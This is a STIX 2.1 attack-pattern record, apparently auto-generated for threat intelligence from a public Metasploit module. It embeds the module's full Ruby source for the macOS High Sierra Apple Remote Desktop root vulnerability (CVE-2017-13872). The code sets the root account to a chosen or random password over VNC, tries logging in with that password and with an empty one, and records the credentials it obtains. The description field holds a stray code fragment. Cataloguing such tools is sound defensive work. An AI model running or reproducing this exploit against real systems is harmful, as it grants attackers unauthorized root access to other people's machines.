{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b2483d74-a2e2-4f67-acb2-f188c78d9e79",
    "created": "2024-08-14T16:27:56.001545Z",
    "modified": "2024-08-14T16:27:56.001551Z",
    "name": "Apple Remote Desktop Root Vulnerability",
    "description": "Enable and set root account to a chosen password on unpatched macOS High Sierra hosts with either Screen Sharing or Remote Management enabled. 'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/vnc/ard_root_pw.rb",
            "external_id": "ard_root_pw.rb"
        },
        {
            "source_name": "reference",
            "url": "https://support.apple.com/en-us/HT208315"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'Apple Remote Desktop Root Vulnerability',\n      'Description' => 'Enable and set root account to a chosen password on unpatched macOS High Sierra hosts with either Screen Sharing or Remote Management enabled.',\n      'References'  =>\n        [\n          ['CVE', '2017-13872'],\n          ['URL', 'https://support.apple.com/en-us/HT208315']\n        ],\n      'Author'      => 'jgor',\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(5900),\n        OptString.new('PASSWORD', [false, 'Set root account to this password', ''])\n      ])\n  end\n\n  def log_credential(password)\n    print_good(\"Login succeeded - root:#{password}\")\n\n    service_data = {\n      address: target_host,\n      port: rport,\n      service_name: 'vnc',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: self.fullname,\n      origin_type: :service,\n      username: 'root',\n      private_data: password,\n      private_type: :password\n    }.merge(service_data)\n\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      core: credential_core,\n      last_attempted_at: DateTime.now,\n      status: Metasploit::Model::Login::Status::SUCCESSFUL\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run_host(target_host)\n    begin\n      if datastore['PASSWORD'].empty?\n        password = Rex::Text::rand_text_alphanumeric(16)\n      else\n        password = datastore['PASSWORD']\n      end\n\n      connect\n      vnc = Rex::Proto::RFB::Client.new(sock)\n      if vnc.handshake\n        type = vnc.negotiate_authentication\n        unless type = Rex::Proto::RFB::AuthType::ARD\n          print_error(\"VNC server does not advertise security type ARD.\")\n          return\n        end\n        print_status(\"Attempting authentication as root.\")\n        if vnc.authenticate_with_type(type, 'root', password)\n          log_credential(password)\n          return\n        end\n      else\n        print_error(\"VNC handshake failed.\")\n        return\n      end\n      disconnect\n\n      connect\n      vnc = Rex::Proto::RFB::Client.new(sock)\n      print_status(\"Testing login as root with chosen password.\")\n      if vnc.handshake\n        if vnc.authenticate_with_user('root', password)\n          log_credential(password)\n          return\n        end\n      else\n        print_error(\"VNC handshake failed.\")\n        return\n      end\n      disconnect\n\n      connect\n      vnc = Rex::Proto::RFB::Client.new(sock)\n      print_status(\"Testing login as root with empty password.\")\n      if vnc.handshake\n        if vnc.authenticate_with_user('root', '')\n          log_credential('')\n          return\n        end\n      else\n        print_error(\"VNC handshake failed.\")\n        return\n      end\n\n    ensure\n      disconnect\n    end\n\n  end\nend\n",
    "x_mitre_contributors": [
        "jgor",
        ""
    ]
}